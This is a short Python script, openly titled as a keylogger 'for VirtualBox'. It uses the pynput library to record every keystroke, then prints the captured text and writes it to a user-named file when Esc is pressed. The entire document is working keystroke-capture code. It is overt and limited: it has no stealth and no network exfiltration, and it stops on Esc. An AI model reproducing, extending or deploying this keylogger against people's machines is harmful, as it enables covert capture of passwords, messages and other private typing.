# keylogger for VirtualBox
from pynput.keyboard import Key, Listener, _win32

global output
output = ""
file_name = input("File Name: ")

def on_press(key):
	global output
	if key == Key.esc:
		# print and write to file
		print(output)
		with open(file_name, 'w') as fp:
			fp.write(output)
		# Stop listener
		return False
	# print('{0} pressed'.format(key))
	# if type pynput.keyboard._win32.KeyCode
	if type(key) == _win32.KeyCode:
		# print(key.__dict__, type(key))
		output += key.char
	elif key == Key.space:
		output += ' '
	elif key == Key.enter:
		output += '\n'
	elif key == Key.tab:
		output += '\t'
	# if key in [Key.space, Key.enter, Key.tab]:
	# 	print(key.__dict__, key._value_)
	# 	output += key._value_


if __name__ == "__main__":
	# Collect events until released
	with Listener(on_press=on_press) as listener:
		listener.join()
